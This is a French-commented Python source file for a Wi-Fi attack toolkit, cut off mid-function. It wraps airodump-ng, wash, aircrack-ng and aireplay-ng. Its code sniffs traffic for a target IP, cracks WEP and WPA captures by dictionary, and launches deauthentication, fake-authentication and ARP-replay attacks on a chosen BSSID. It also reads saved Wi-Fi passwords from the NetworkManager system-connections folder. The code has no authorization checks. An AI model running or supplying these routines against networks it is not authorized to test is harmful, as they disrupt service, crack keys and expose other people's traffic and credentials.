import subprocess
import time
import os
import json
import csv
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import requests
import re
import logging
from functools import lru_cache
from scapy.all import sniff, IP, TCP, UDP, ICMP, wrpcap
import tkinter as tk
from tkinter import ttk
from tkinter import simpledialog
from tkinter import messagebox

# Initialisation de la console et du système de journalisation
console = Console()
logging.basicConfig(filename='wifi_tool.log', level=logging.INFO, 
                    format='%(asctime)s - [%(funcName)s] - %(levelname)s - %(message)s')

# ====== FONCTIONS UTILITAIRES ======
def valider_mac(mac):
    """Valide le format d'une adresse MAC."""
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

def valider_interface(iface):
    """Valide le nom d'une interface réseau."""
    pattern = r'^[a-zA-Z0-9]+$'
    return bool(re.match(pattern, iface))

def valider_ip(ip):
    """Valide le format d'une adresse IP."""
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    return bool(re.match(pattern, ip))

@lru_cache(maxsize=1000)
def obtenir_fabricant(mac):
    """Récupère le fabricant à partir d'une adresse MAC avec mise en cache."""
    logging.info(f"Recherche du fabricant pour MAC {mac}")
    if not valider_mac(mac):
        return "MAC invalide"
    try:
        response = requests.get(f'https://api.macvendors.com/{mac}', timeout=5)
        return response.text if response.status_code == 200 else "Inconnu"
    except requests.RequestException as e:
        logging.error(f"Échec de la recherche MAC pour {mac}: {e}")
        return "Erreur"

# ====== OBTENIR LE RÉSEAU CONNECTÉ ======
def obtenir_reseau_connecte(interface):
    """Récupère le SSID et le BSSID du réseau auquel l'interface est connectée."""
    logging.info(f"Vérification du réseau connecté sur {interface}")
    try:
        resultat = subprocess.run(['iwconfig', interface], capture_output=True, text=True, check=True)
        sortie = resultat.stdout
        ssid_match = re.search(r'ESSID:"([^"]+)"', sortie)
        bssid_match = re.search(r'Access Point: ([0-9A-Fa-f:]{17})', sortie)
        if ssid_match and bssid_match:
            logging.info(f"Réseau connecté trouvé: SSID={ssid_match.group(1)}, BSSID={bssid_match.group(1)}")
            return {"ssid": ssid_match.group(1), "bssid": bssid_match.group(1)}
        console.print("[red]Aucun réseau connecté détecté sur cette interface.[/red]")
        logging.warning(f"Aucun réseau connecté détecté sur {interface}")
        return None
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Erreur lors de la vérification du réseau : {e}[/red]")
        logging.error(f"Erreur lors de la vérification du réseau sur {interface}: {e}")
        return None

# ====== SURVEILLANCE DU TRAFIC IP ======
def surveiller_trafic_ip(interface, ip_cible, duree=30):
    """Surveille le trafic réseau pour une adresse IP donnée et affiche un résumé."""
    logging.info(f"Début de la surveillance du trafic IP pour {ip_cible} sur {interface} pendant {duree}s")
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return
    if not valider_ip(ip_cible):
        console.print("[red]Adresse IP invalide ![/red]")
        logging.error(f"IP invalide: {ip_cible}")
        messagebox.showerror("Erreur", "Adresse IP invalide !")
        return

    # Créer un dossier pour stocker les captures
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_capture = f"trafic_ip_{ip_cible.replace('.', '_')}_{horodatage}"
    os.makedirs(dossier_capture, exist_ok=True)
    fichier_pcap = os.path.join(dossier_capture, f"capture_ip_{horodatage}.pcap")

    console.print(f"[bold yellow]Surveillance du trafic pour l'IP {ip_cible} sur {interface} pendant {duree} secondes...[/bold yellow]")

    # Liste pour stocker les informations des paquets
    paquets_info = []

    def traiter_paquet(paquet):
        """Fonction de callback pour traiter chaque paquet capturé."""
        if IP in paquet:
            ip_src = paquet[IP].src
            ip_dst = paquet[IP].dst
            if ip_src == ip_cible or ip_dst == ip_cible:
                proto = "Inconnu"
                port_src = "-"
                port_dst = "-"
                taille = len(paquet)

                if TCP in paquet:
                    proto = "TCP"
                    port_src = str(paquet[TCP].sport)
                    port_dst = str(paquet[TCP].dport)
                elif UDP in paquet:
                    proto = "UDP"
                    port_src = str(paquet[UDP].sport)
                    port_dst = str(paquet[UDP].dport)
                elif ICMP in paquet:
                    proto = "ICMP"

                paquets_info.append({
                    "ip_src": ip_src,
                    "ip_dst": ip_dst,
                    "protocole": proto,
                    "port_src": port_src,
                    "port_dst": port_dst,
                    "taille": taille,
                    "horodatage": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })

    # Capturer les paquets
    try:
        with Progress() as progress:
            tache = progress.add_task("[cyan]Capture des paquets...", total=duree)
            paquets = sniff(iface=interface, filter=f"ip host {ip_cible}", timeout=duree, prn=traiter_paquet)
            progress.update(tache, advance=duree)

        # Sauvegarder les paquets capturés dans un fichier .pcap
        if paquets:
            wrpcap(fichier_pcap, paquets)
            console.print(f"[green]Paquets sauvegardés dans {fichier_pcap}[/green]")
            logging.info(f"Capture de trafic IP sauvegardée dans {fichier_pcap}")
            messagebox.showinfo("Succès", f"Paquets sauvegardés dans {fichier_pcap}")
        else:
            console.print(f"[yellow]Aucun paquet capturé pour l'IP {ip_cible}.[/yellow]")
            logging.info(f"Aucun paquet capturé pour l'IP {ip_cible}")
            messagebox.showwarning("Avertissement", f"Aucun paquet capturé pour l'IP {ip_cible}.")

        # Afficher un tableau récapitulatif
        tableau_trafic = Table(title=f"Trafic réseau pour l'IP {ip_cible}")
        tableau_trafic.add_column("Horodatage", style="cyan")
        tableau_trafic.add_column("IP Source", style="magenta")
        tableau_trafic.add_column("IP Destination", style="yellow")
        tableau_trafic.add_column("Protocole", style="green")
        tableau_trafic.add_column("Port Source", style="blue")
        tableau_trafic.add_column("Port Destination", style="blue")
        tableau_trafic.add_column("Taille (octets)", style="white")

        for info in paquets_info:
            tableau_trafic.add_row(
                info["horodatage"],
                info["ip_src"],
                info["ip_dst"],
                info["protocole"],
                info["port_src"],
                info["port_dst"],
                str(info["taille"])
            )

        console.print(tableau_trafic)
        logging.info(f"Trafic réseau analysé pour l'IP {ip_cible}: {len(paquets_info)} paquets capturés, fichier={fichier_pcap}")

    except KeyboardInterrupt:
        console.print("[red]Capture arrêtée par l'utilisateur[/red]")
        logging.info("Capture de trafic IP arrêtée par l'utilisateur")
        messagebox.showinfo("Info", "Capture arrêtée par l'utilisateur")
    except Exception as e:
        console.print(f"[red]Erreur lors de la capture du trafic : {e}[/red]")
        logging.error(f"Erreur lors de la capture du trafic IP {ip_cible}: {e}")
        messagebox.showerror("Erreur", f"Erreur lors de la capture du trafic : {e}")

# ====== SCAN WIFI EN TEMPS RÉEL ======
def scan_wifi_temps_reel(interface, signal_min=-70, fichier_sortie=None):
    """Scanne les réseaux Wi-Fi en mode moniteur avec filtre d'intensité de signal."""
    logging.info(f"Début du scan Wi-Fi en temps réel sur {interface} avec signal_min={signal_min}")
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return None

    console.print(f"[bold yellow]Scan Wi-Fi en mode moniteur sur {interface}...[/bold yellow]")
    for f in ["scan_temp-01.csv", "scan_temp.csv"]:
        if os.path.exists(f):
            os.remove(f)

    proc = subprocess.Popen(['sudo', 'airodump-ng', '--output-format', 'csv', '-w', 'scan_temp', interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    resultats = {"points_acces": [], "clients": []}
    with Progress() as progress:
        tache = progress.add_task("[cyan]Scan en cours...", total=100)
        try:
            time.sleep(10)  # Attendre pour collecter des données
            if not os.path.exists('scan_temp-01.csv'):
                console.print("[red]Aucune donnée collectée.[/red]")
                logging.warning("Aucune donnée collectée lors du scan")
                messagebox.showerror("Erreur", "Aucune donnée collectée.")
                return None
            try:
                with open('scan_temp-01.csv', 'r', encoding='utf-8', errors='ignore') as f:
                    donnees = f.read()
            except Exception as e:
                console.print(f"[red]Erreur de lecture des données : {e}[/red]")
                logging.error(f"Erreur de lecture des données: {e}")
                messagebox.showerror("Erreur", f"Erreur de lecture des données : {e}")
                return None

            sections = donnees.split("Station MAC")
            section_ap = sections[0].splitlines()[2:]  # Sauter les deux premières lignes (en-tête + ligne vide)
            section_clients = sections[1].splitlines()[2:] if len(sections) > 1 else []  # Sauter l'en-tête des clients

            # Tableau des points d'accès
            tableau_ap = Table(title="Points d'accès Wi-Fi détectés")
            tableau_ap.add_column("SSID", style="cyan")
            tableau_ap.add_column("BSSID (MAC)", style="magenta")
            tableau_ap.add_column("Sécurité", style="yellow")
            tableau_ap.add_column("Signal (dBm)", style="green")
            tableau_ap.add_column("Fabricant", style="blue")
            aps = []
            for ligne in section_ap:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 14 and champs[0] and champs[8].strip().lstrip('-').isdigit():
                    try:
                        signal = int(champs[8])
                        if signal >= signal_min:
                            bssid = champs[0]
                            ssid = champs[13] if champs[13].strip() else "<Masqué>"
                            securite = champs[5]
                            canal = champs[3]
                            fabricant = obtenir_fabricant(bssid)
                            tableau_ap.add_row(ssid, bssid, securite, str(signal), fabricant)
                            aps.append({"ssid": ssid, "bssid": bssid, "securite": securite, "signal": signal, "canal": canal, "fabricant": fabricant})
                    except ValueError as e:
                        logging.warning(f"Erreur de conversion du signal pour la ligne {ligne}: {e}")
                        continue

            # Tableau des clients
            tableau_clients = Table(title="Clients connectés")
            tableau_clients.add_column("BSSID AP", style="magenta")
            tableau_clients.add_column("MAC Client", style="cyan")
            tableau_clients.add_column("Fabricant", style="yellow")
            tableau_clients.add_column("Signal (dBm)", style="green")
            clients = []
            for ligne in section_clients:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 6 and champs[0] and champs[3].strip().lstrip('-').isdigit():
                    try:
                        signal = int(champs[3])
                        if signal >= signal_min:
                            mac_client = champs[0]
                            bssid_ap = champs[5]
                            fabricant = obtenir_fabricant(mac_client)
                            tableau_clients.add_row(bssid_ap, mac_client, fabricant, str(signal))
                            clients.append({"mac_client": mac_client, "bssid_ap": bssid_ap, "signal": signal, "fabricant": fabricant})
                    except ValueError as e:
                        logging.warning(f"Erreur de conversion du signal client pour la ligne {ligne}: {e}")
                        continue

            resultats["points_acces"] = aps
            resultats["clients"] = clients
            console.clear()
            console.print(tableau_ap)
            console.print(tableau_clients)
            progress.update(tache, advance=100)
            messagebox.showinfo("Succès", f"Scan terminé : {len(aps)} points d'accès, {len(clients)} clients détectés")

        except KeyboardInterrupt:
            proc.terminate()
            console.print("[red]Scan arrêté par l'utilisateur[/red]")
            logging.info("Scan Wi-Fi arrêté par l'utilisateur")
            messagebox.showinfo("Info", "Scan arrêté par l'utilisateur")
            return None
        finally:
            proc.terminate()

    # Sauvegarde des résultats si demandée
    if fichier_sortie:
        horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
        fichier_json = f"{fichier_sortie}_{horodatage}.json"
        with open(fichier_json, 'w') as f:
            json.dump(resultats, f, indent=4)
        console.print(f"[green]Résultats sauvegardés dans {fichier_json}[/green]")
        logging.info(f"Résultats du scan sauvegardés dans {fichier_json}")
        messagebox.showinfo("Succès", f"Résultats sauvegardés dans {fichier_json}")
    
    logging.info(f"Scan Wi-Fi terminé: {len(aps)} points d'accès, {len(clients)} clients détectés")
    return resultats

# ====== DÉTECTION DES VULNÉRABILITÉS WIFI ======
def detecter_vulnerabilites_wifi(interface):
    """Scanne les réseaux Wi-Fi pour détecter WPS et SSID masqué."""
    logging.info(f"Début de la détection des vulnérabilités Wi-Fi sur {interface}")
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return

    console.print(f"[bold yellow]Détection des vulnérabilités Wi-Fi sur {interface}...[/bold yellow]")
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_vuln = f"vulnerabilites_{horodatage}"
    os.makedirs(dossier_vuln, exist_ok=True)
    fichier_csv = os.path.join(dossier_vuln, f"scan_vuln_{horodatage}")
    fichier_wash = os.path.join(dossier_vuln, f"wash_vuln_{horodatage}.json")

    # Lancer airodump-ng pour scanner les réseaux
    proc = subprocess.Popen(['sudo', 'airodump-ng', '--output-format', 'csv', '-w', fichier_csv, interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Lancer wash pour détecter WPS
    proc_wash = subprocess.Popen(['sudo', 'wash', '-i', interface, '-j', '-o', fichier_wash],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        with Progress() as progress:
            tache = progress.add_task("[cyan]Scan des vulnérabilités...", total=10)
            time.sleep(10)  # Attendre pour collecter des données
            progress.update(tache, advance=10)

        # Lire les données de airodump-ng
        fichier_csv_path = f"{fichier_csv}-01.csv"
        reseaux = []
        if os.path.exists(fichier_csv_path):
            with open(fichier_csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                donnees = f.read()
            section_ap = donnees.split("Station MAC")[0].splitlines()[2:]
            for ligne in section_ap:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 14 and champs[0]:
                    ssid = champs[13] if champs[13].strip() else "<Masqué>"
                    reseaux.append({
                        "ssid": ssid,
                        "bssid": champs[0],
                        "securite": champs[5],
                        "signal": champs[8],
                        "ssid_masque": ssid == "<Masqué>",
                        "wps": False  # Initialisé, mis à jour avec wash
                    })

        # Lire les données de wash pour WPS
        wps_data = {}
        if os.path.exists(fichier_wash):
            with open(fichier_wash, 'r') as f:
                try:
                    wps_data = json.load(f)
                except json.JSONDecodeError:
                    console.print("[yellow]Aucune donnée WPS valide détectée.[/yellow]")
                    messagebox.showwarning("Avertissement", "Aucune donnée WPS valide détectée.")
            for item in wps_data:
                wps_data[item["bssid"]] = item.get("wps", False)

        # Combiner les données
        for reseau in reseaux:
            reseau["wps"] = wps_data.get(reseau["bssid"], False)

        # Afficher un tableau récapitulatif
        tableau = Table(title="Vulnérabilités des réseaux Wi-Fi")
        tableau.add_column("SSID", style="cyan")
        tableau.add_column("BSSID", style="magenta")
        tableau.add_column("Sécurité", style="yellow")
        tableau.add_column("Signal (dBm)", style="green")
        tableau.add_column("WPS", style="red")
        tableau.add_column("SSID Masqué", style="blue")

        for reseau in reseaux:
            tableau.add_row(
                reseau["ssid"],
                reseau["bssid"],
                reseau["securite"],
                reseau["signal"],
                "Activé" if reseau["wps"] else "Désactivé",
                "Oui" if reseau["ssid_masque"] else "Non"
            )

        console.print(tableau)
        logging.info(f"Détection des vulnérabilités terminée: {len(reseaux)} réseaux détectés")
        messagebox.showinfo("Succès", f"Détection terminée : {len(reseaux)} réseaux analysés")

        # Sauvegarder les résultats
        fichier_json = os.path.join(dossier_vuln, f"vulnerabilites_{horodatage}.json")
        with open(fichier_json, 'w') as f:
            json.dump(reseaux, f, indent=4)
        console.print(f"[green]Résultats sauvegardés dans {fichier_json}[/green]")
        logging.info(f"Résultats des vulnérabilités sauvegardés dans {fichier_json}")
        messagebox.showinfo("Succès", f"Résultats sauvegardés dans {fichier_json}")

    except KeyboardInterrupt:
        proc.terminate()
        proc_wash.terminate()
        console.print("[red]Scan arrêté par l'utilisateur[/red]")
        logging.info("Scan des vulnérabilités arrêté par l'utilisateur")
        messagebox.showinfo("Info", "Scan arrêté par l'utilisateur")
    except Exception as e:
        console.print(f"[red]Erreur lors de la détection des vulnérabilités : {e}[/red]")
        logging.error(f"Erreur lors de la détection des vulnérabilités : {e}")
        messagebox.showerror("Erreur", f"Erreur lors de la détection des vulnérabilités : {e}")
    finally:
        proc.terminate()
        proc_wash.terminate()
        for f in [f"{fichier_csv}-01.csv", f"{fichier_csv}.csv", fichier_wash]:
            if os.path.exists(f):
                os.remove(f)

# ====== SURVEILLANCE EN TEMPS RÉEL AVEC GUI ======
def surveiller_clients_gui(interface):
    """Affiche une interface graphique pour surveiller les clients connectés en temps réel."""
    logging.info(f"Début de la surveillance en temps réel avec GUI sur {interface}")
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return

    # Vérifier si l'interface est connectée à un réseau
    reseau = obtenir_reseau_connecte(interface)
    if not reseau:
        console.print("[red]Vous devez être connecté à un réseau Wi-Fi pour utiliser cette fonction.[/red]")
        logging.error("Aucun réseau connecté détecté")
        messagebox.showerror("Erreur", "Vous devez être connecté à un réseau Wi-Fi pour utiliser cette fonction.")
        return

    ssid = reseau["ssid"]
    bssid = reseau["bssid"]
    console.print(f"[bold yellow]Lancement de la surveillance en temps réel pour {ssid} ({bssid})...[/bold yellow]")

    # Créer un dossier pour les captures temporaires
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_capture = f"clients_gui_{bssid.replace(':', '')}_{horodatage}"
    os.makedirs(dossier_capture, exist_ok=True)
    fichier_csv = os.path.join(dossier_capture, f"scan_clients_{horodatage}")

    # Initialiser la fenêtre Tkinter
    fenetre = tk.Tk()
    fenetre.title(f"Surveillance des clients - {ssid} ({bssid})")
    fenetre.geometry("800x400")

    # Créer un tableau avec Tkinter
    tableau = ttk.Treeview(fenetre, columns=("MAC", "Fabricant", "Signal"), show="headings")
    tableau.heading("MAC", text="MAC Client")
    tableau.heading("Fabricant", text="Fabricant")
    tableau.heading("Signal", text="Signal (dBm)")
    tableau.pack(fill="both", expand=True)

    # Bouton pour arrêter la surveillance
    running = tk.BooleanVar(value=True)
    def arreter_surveillance():
        running.set(False)
        fenetre.destroy()

    bouton_arret = tk.Button(fenetre, text="Arrêter la surveillance", command=arreter_surveillance)
    bouton_arret.pack(pady=10)

    def actualiser_tableau():
        """Met à jour le tableau avec les clients détectés."""
        if not running.get():
            return

        # Lancer airodump-ng pour capturer les clients
        proc = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '--output-format', 'csv', '-w', fichier_csv, interface],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(5)  # Attendre pour collecter des données
        proc.terminate()

        # Lire les données
        fichier_csv_path = f"{fichier_csv}-01.csv"
        clients = []
        if os.path.exists(fichier_csv_path):
            with open(fichier_csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                donnees = f.read()
            sections = donnees.split("Station MAC")
            section_clients = sections[1].splitlines()[2:] if len(sections) > 1 else []
            for ligne in section_clients:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 6 and champs[0] and champs[3].strip().lstrip('-').isdigit():
                    try:
                        signal = int(champs[3])
                        mac_client = champs[0]
                        fabricant = obtenir_fabricant(mac_client)
                        clients.append({"mac_client": mac_client, "fabricant": fabricant, "signal": signal})
                    except ValueError as e:
                        logging.warning(f"Erreur de conversion du signal client pour la ligne {ligne}: {e}")

        # Mettre à jour le tableau Tkinter
        for item in tableau.get_children():
            tableau.delete(item)
        for client in clients:
            tableau.insert("", "end", values=(client["mac_client"], client["fabricant"], str(client["signal"])))

        # Nettoyer les fichiers temporaires
        for f in [f"{fichier_csv}-01.csv", f"{fichier_csv}.csv"]:
            if os.path.exists(f):
                os.remove(f)

        # Planifier la prochaine mise à jour
        if running.get():
            fenetre.after(5000, actualiser_tableau)

    try:
        actualiser_tableau()
        fenetre.mainloop()
        logging.info(f"Surveillance en temps réel terminée pour {ssid} ({bssid})")
        messagebox.showinfo("Info", f"Surveillance terminée pour {ssid} ({bssid})")
    except Exception as e:
        console.print(f"[red]Erreur lors de la surveillance en temps réel : {e}[/red]")
        logging.error(f"Erreur lors de la surveillance en temps réel : {e}")
        messagebox.showerror("Erreur", f"Erreur lors de la surveillance en temps réel : {e}")
    finally:
        # Nettoyer le dossier si vide
        if os.path.exists(dossier_capture) and not os.listdir(dossier_capture):
            os.rmdir(dossier_capture)

# ====== SCAN WIFI NORMAL ======
def scan_wifi_normal():
    """Scanne les réseaux Wi-Fi en mode géré."""
    logging.info("Début du scan Wi-Fi en mode normal")
    console.print("[bold yellow]Scan Wi-Fi en mode normal...[/bold yellow]")
    try:
        resultat = subprocess.run(['nmcli', '-f', 'SSID,BSSID,SECURITY,SIGNAL', 'dev', 'wifi'], 
                                capture_output=True, text=True, check=True)
        sortie = resultat.stdout
        tableau = Table(title="Réseaux Wi-Fi détectés")
        tableau.add_column("SSID", style="cyan")
        tableau.add_column("BSSID (MAC)", style="magenta")
        tableau.add_column("Sécurité", style="yellow")
        tableau.add_column("Signal (%)", style="green")
        lignes = sortie.strip().split('\n')[1:]
        reseaux = []
        for ligne in lignes:
            parties = ligne.split()
            if len(parties) >= 3:
                ssid = " ".join(parties[:-2])
                bssid = parties[-2]
                securite = parties[-1]
                signal = parties[-1]
                tableau.add_row(ssid, bssid, securite, signal)
                reseaux.append({"ssid": ssid, "bssid": bssid, "securite": securite, "signal": signal})
        console.print(tableau)
        logging.info(f"Scan Wi-Fi normal terminé: {len(reseaux)} réseaux détectés")
        messagebox.showinfo("Succès", f"Scan terminé : {len(reseaux)} réseaux détectés")
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Erreur pendant le scan : {e}[/red]")
        logging.error(f"Erreur de scan normal : {e}")
        messagebox.showerror("Erreur", f"Erreur pendant le scan : {e}")

# ====== DÉTECTION DU MODE ET SCAN ======
def scan_wifi():
    """Détecte le mode de l'interface et lance le scan approprié."""
    logging.info("Début de la détection du mode et scan Wi-Fi")
    try:
        resultat = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True)
        interface_moniteur = None
        for ligne in resultat.stdout.splitlines():
            if 'Mode:Monitor' in ligne:
                interface_moniteur = ligne.split()[0]
                break
        signal_min = simpledialog.askinteger("Signal Min", "Entrez l'intensité minimale du signal (ex. -70 dBm, défaut -70) : ", minvalue=-100, maxvalue=0) or -70
        fichier_sortie = simpledialog.askstring("Sauvegarde", "Sauvegarder les résultats dans un fichier ? Entrez le nom (ou vide pour ignorer) : ")
        if interface_moniteur:
            logging.info(f"Interface en mode moniteur détectée: {interface_moniteur}")
            return scan_wifi_temps_reel(interface_moniteur, signal_min, fichier_sortie or None)
        else:
            logging.info("Aucune interface en mode moniteur, lancement du scan normal")
            scan_wifi_normal()
            return None
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Erreur de détection de l'interface : {e}[/red]")
        logging.error(f"Erreur de détection d'interface : {e}")
        messagebox.showerror("Erreur", f"Erreur de détection de l'interface : {e}")
        return None

# ====== DÉCHIFFREMENT FICHIER .CAP ======
def dechiffrer_cap(fichier_cap, type_securite, fichier_dico=None):
    """Déchiffre un fichier .cap pour WEP ou WPA/WPA2."""
    logging.info(f"Début du déchiffrement du fichier {fichier_cap} ({type_securite})")
    if not fichier_cap or not os.path.exists(fichier_cap):
        console.print("[red]Le fichier n'existe pas ![/red]")
        logging.error(f"Fichier {fichier_cap} n'existe pas")
        messagebox.showerror("Erreur", "Le fichier n'existe pas !")
        return False

    if type_securite == 'WEP':
        console.print(f"[green]Déchiffrement WEP du fichier {fichier_cap}...[/green]")
        console.print("[yellow]Assurez-vous d'avoir suffisamment de paquets IV pour réussir.[/yellow]")
        resultat = subprocess.run(['aircrack-ng', fichier_cap], capture_output=True, text=True, check=False)
        console.print(resultat.stdout)
        status = "Succès" if "KEY FOUND" in resultat.stdout else "Échec"
        logging.info(f"Déchiffrement WEP terminé: {status}")
        messagebox.showinfo("Résultat", f"Déchiffrement WEP : {status}")
        return "KEY FOUND" in resultat.stdout
    elif type_securite == 'WPA':
        if not fichier_dico or not os.path.exists(fichier_dico):
            console.print("[red]Fichier dictionnaire requis pour WPA/WPA2 ![/red]")
            logging.error(f"Fichier dictionnaire manquant ou invalide: {fichier_dico}")
            messagebox.showerror("Erreur", "Fichier dictionnaire requis pour WPA/WPA2 !")
            return False
        console.print(f"[green]Attaque par dictionnaire sur {fichier_cap} avec {fichier_dico}...[/green]")
        resultat = subprocess.run(['aircrack-ng', '-w', fichier_dico, fichier_cap], capture_output=True, text=True, check=False)
        console.print(resultat.stdout)
        status = "Succès" if "KEY FOUND" in resultat.stdout else "Échec"
        logging.info(f"Déchiffrement WPA terminé: {status}, fichier dictionnaire={fichier_dico}")
        messagebox.showinfo("Résultat", f"Déchiffrement WPA : {status}")
        return "KEY FOUND" in resultat.stdout
    else:
        console.print("[red]Type de sécurité invalide ![/red]")
        logging.error(f"Type de sécurité invalide: {type_securite}")
        messagebox.showerror("Erreur", "Type de sécurité invalide !")
        return False

# ====== ATTAQUES WIFI ======
def attaquer_wifi(bssid, interface, canal, type_attaque):
    """Effectue des attaques Wi-Fi avec aireplay-ng."""
    logging.info(f"Début de l'attaque Wi-Fi: BSSID={bssid}, interface={interface}, canal={canal}, type={type_attaque}")
    if not bssid or not valider_mac(bssid):
        console.print("[red]Format de BSSID invalide ![/red]")
        logging.error(f"BSSID invalide: {bssid}")
        messagebox.showerror("Erreur", "Format de BSSID invalide !")
        return False
    if not interface or not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return False
    if not canal or not canal.isdigit() or not 1 <= int(canal) <= 14:
        console.print("[red]Canal invalide (doit être entre 1 et 14) ![/red]")
        logging.error(f"Canal invalide: {canal}")
        messagebox.showerror("Erreur", "Canal invalide (doit être entre 1 et 14) !")
        return False

    console.print(f"[bold yellow]Réglage de {interface} sur le canal {canal}...[/bold yellow]")
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', canal], check=False)

    if type_attaque == 'deauth':
        console.print(f"[green]Envoi de déauthentification à {bssid} sur le canal {canal}...[/green]")
        subprocess.run(['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, interface], check=False)
        logging.info(f"Attaque de déauthentification terminée pour {bssid}")
        messagebox.showinfo("Succès", f"Attaque de déauthentification terminée pour {bssid}")
        return True
    elif type_attaque == 'fakeauth':
        console.print(f"[green]Fake auth sur {bssid} sur le canal {canal}...[/green]")
        subprocess.run(['sudo', 'aireplay-ng', '--fakeauth', '10', '-a', bssid, interface], check=False)
        logging.info(f"Attaque fake auth terminée pour {bssid}")
        messagebox.showinfo("Succès", f"Attaque fake auth terminée pour {bssid}")
        return True
    elif type_attaque == 'arpreplay':
        console.print(f"[green]Injection ARP sur {bssid} sur le canal {canal}...[/green]")
        subprocess.run(['sudo', 'aireplay-ng', '--arpreplay', '-b', bssid, interface], check=False)
        logging.info(f"Attaque ARP replay terminée pour {bssid}")
        messagebox.showinfo("Succès", f"Attaque ARP replay terminée pour {bssid}")
        return True
    else:
        console.print("[red]Type d'attaque invalide ![/red]")
        logging.error(f"Type d'attaque invalide: {type_attaque}")
        messagebox.showerror("Erreur", "Type d'attaque invalide !")
        return False

# ====== HISTORIQUE WIFI ======
def historique_wifi():
    """Affiche les réseaux Wi-Fi enregistrés avec leurs détails."""
    logging.info("Affichage de l'historique des connexions Wi-Fi")
    console.print("[bold yellow]Historique des connexions Wi-Fi[/bold yellow]")
    chemin_nm = "/etc/NetworkManager/system-connections/"
    tableau = Table(title="Réseaux Wi-Fi enregistrés")
    tableau.add_column("SSID", style="cyan")
    tableau.add_column("UUID", style="magenta")
    tableau.add_column("Type", style="yellow")
    tableau.add_column("Mot de passe", style="green")
    tableau.add_column("BSSID", style="red")

    try:
        fichiers = os.listdir(chemin_nm)
        for fichier in fichiers:
            chemin_fichier = os.path.join(chemin_nm, fichier)
            ssid = fichier
            uuid = "N/A"
            type_conn = "wifi"
            mot_de_passe = "N/A"
            bssid = "N/A"
            try:
                with open(chemin_fichier, 'r', encoding='utf-8') as f:
                    lignes = f.readlines()
                    for ligne in lignes:
                        ligne = ligne.strip()
                        if ligne.startswith("psk="):
                            mot_de_passe = ligne.split('=', 1)[1]
                        elif ligne.startswith("uuid="):
                            uuid = ligne.split('=', 1)[1]
                        elif ligne.startswith("type="):
                            type_conn = ligne.split('=', 1)[1]
                        elif ligne.startswith("bssid="):
                            bssid = ligne.split('=', 1)[1]
            except PermissionError:
                mot_de_passe = "N/A (root requis)"
            tableau.add_row(ssid, uuid, type_conn, mot_de_passe, bssid)
        console.print(tableau)
        logging.info(f"Historique Wi-Fi affiché: {len(fichiers)} réseaux trouvés")
        messagebox.showinfo("Succès", f"Historique affiché : {len(fichiers)} réseaux trouvés")
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")
        logging.error(f"Erreur dans l'historique Wi-Fi : {e}")
        messagebox.showerror("Erreur", f"Erreur : {e}")

# ====== COMPTER LES APPAREILS CONNECTÉS ======
def compter_appareils_connectes(interface):
    """Compte les appareils connectés au réseau auquel l'interface est connectée."""
    logging.info(f"Début du comptage des appareils connectés sur {interface}")
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return 0

    # Vérifier si l'interface est connectée à un réseau
    reseau = obtenir_reseau_connecte(interface)
    if not reseau:
        console.print("[red]Vous devez être connecté à un réseau Wi-Fi pour utiliser cette fonction.[/red]")
        logging.error("Aucun réseau connecté détecté")
        messagebox.showerror("Erreur", "Vous devez être connecté à un réseau Wi-Fi pour utiliser cette fonction.")
        return 0

    ssid = reseau["ssid"]
    bssid = reseau["bssid"]
    console.print(f"[bold yellow]Comptage des appareils connectés au réseau {ssid} ({bssid})...[/bold yellow]")

    # Créer un dossier pour stocker les captures
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_capture = f"clients_{bssid.replace(':', '')}_{horodatage}"
    os.makedirs(dossier_capture, exist_ok=True)
    fichier_csv = os.path.join(dossier_capture, f"scan_clients_{horodatage}")

    # Lancer airodump-ng avec filtre sur le BSSID
